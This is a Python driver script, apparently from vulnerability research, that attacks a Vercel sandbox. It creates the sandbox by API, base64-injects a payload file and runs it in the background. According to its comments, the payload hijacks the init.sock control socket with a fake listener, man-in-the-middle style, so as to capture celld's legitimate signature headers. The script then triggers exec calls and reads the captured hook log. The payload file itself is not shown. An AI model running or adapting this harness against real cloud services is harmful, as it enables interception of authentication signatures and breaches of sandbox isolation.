# -*- coding: utf-8 -*-
"""v205 驱动: init.sock 中间人 - 捕获 celld 合法签名
1. inject payload -> 后台启动 (mv init.sock + 假监听)
2. 触发沙箱 API exec (celld -> init.sock Spawn) -> hook 记录签名头
3. 等 payload 恢复 socket -> cat hook log -> 验证恢复"""
import sys, os, time, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME = 'v205'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda205_probe_user.py'


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def main():
    t0 = time.time()
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    sid = fresh_sandbox(NAME)
    print('[create ok] %.0fs' % (time.time() - t0))

    inject(sid, '/vercel/sandbox/vda205_probe_user.py', open(PAY, 'rb').read())

    # 后台启动 payload (hook 就位, 窗口 65s)
    c, r = cmd(sid, 'bash', ['-c', 'nohup python3 /vercel/sandbox/vda205_probe_user.py > /vercel/sandbox/v205out.log 2>&1 &'], 20000)
    print('[bg payload]', c, (r or '')[:300])
    time.sleep(5)

    # 触发 celld -> init.sock 的合法签名请求 (exec)
    c, r = cmd(sid, 'echo', ['hello-v205'], 30000)
    print('[trigger1 echo]', c, (r or '')[:600])
    time.sleep(3)
    c, r = cmd(sid, 'ls', ['/tmp'], 30000)
    print('[trigger2 ls]', c, (r or '')[:600])

    # 等 payload 恢复 socket (窗口 65s 结束)
    time.sleep(60)
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/v205hook.log'], 30000)
    print('[hook log]', c)
    print((r or '')[:12000])
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/v205out.log'], 20000)
    print('[out log]', c)
    print((r or '')[:4000])

    # 恢复后验证沙箱 API 正常
    c, r = cmd(sid, 'echo', ['post-restore-ok'], 30000)
    print('[post-restore]', c, (r or '')[:300])

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED total %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
